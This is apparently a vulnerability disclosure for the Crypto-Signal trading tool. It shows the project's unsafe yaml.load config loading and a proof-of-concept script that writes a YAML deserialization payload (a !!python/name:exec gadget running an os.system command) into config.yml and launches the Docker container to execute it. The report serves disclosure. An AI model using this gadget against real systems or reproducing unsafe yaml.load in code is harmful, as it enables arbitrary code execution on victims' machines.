# Description
Crypto Signals is a command line tool that automates your crypto currency Technical Analysis (TA). It is maintained by a community of traders, engineers, data scientists, PMs, & countless generous individuals who wish to democratize the equal & open access to the greatest wealth re-distribution experiment in human and monetary policy history - Bitcoin
* **Vulnerability discription**
unsafe loading of data by the yaml.load function leading to Arbitrary code execution. Here this vulnerability forces to execute Code inside the docker container which runs the tool Crypto-Signal.
# Proof of Concept
* Vulnerable code part 
```python
with open('defaults.yml', 'r') as config_file:
            default_config = yaml.load(config_file)
if os.path.isfile('config.yml'):
    with open('config.yml', 'r') as config_file:
        user_config = yaml.load(config_file)
#https://github.com/CryptoSignal/Crypto-Signal/blob/master/app/conf.py#L21
```
1. run exploit.py
```python
# exploit.py
import os
#PAYLOAD SECTION
exploit = """settings: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('echo pwned')"
"""
os.system('rm -r config.yml')
open('config.yml','w+').write(exploit)
os.system('docker run --rm -v $PWD/config.yml:/app/config.yml shadowreaver/crypto-signal:master')
```

![]()
